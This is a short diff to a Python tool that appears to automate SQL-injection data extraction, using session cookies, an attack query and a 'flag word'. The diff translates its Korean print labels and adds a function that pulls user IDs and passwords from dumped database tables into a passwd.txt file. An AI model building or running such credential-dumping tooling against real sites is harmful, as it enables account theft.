@@ -21,8 +21,8 @@ class attackData:
     def show(self):
         print(f"\nbase URL = {self.base_url}")
         print(f"SessionID = {self.cookies['JSESSIONID']}")
-        print(f"설정된 공격 쿼리 : {self.data['keywords']}")
-        print(f"true 판별 기준(flag_word) = {self.flag_word}")
+        print(f"Attack Query : {self.data['keywords']}")
+        print(f"Flag word = {self.flag_word}")
 
     def set_url(self,new_url):
         self.base_url = new_url
@@ -135,6 +135,22 @@ class tableInfo:
         with pd.ExcelWriter('output.xlsx') as writer:
             for i, table in enumerate(self.tables):
                 dfs[i].to_excel(writer, sheet_name=table, index=False)
+
+    def export_passwd(self):
+        # xlsx 파일 읽기
+        df = pd.read_excel('output.xlsx')
+
+        # 필요한 열만 추출
+        df_selected = df[['USER_ID', 'USER_PW']]
+
+        # txt 파일로 저장
+        with open('passwd.txt', 'w') as f:
+            for index, row in df_selected.iterrows():
+                user_nm = str(row['USER_ID'])
+                user_pw = str(row['USER_PW'])
+                f.write(f"{user_nm}:{user_pw}\n")
+
+
 
             
 
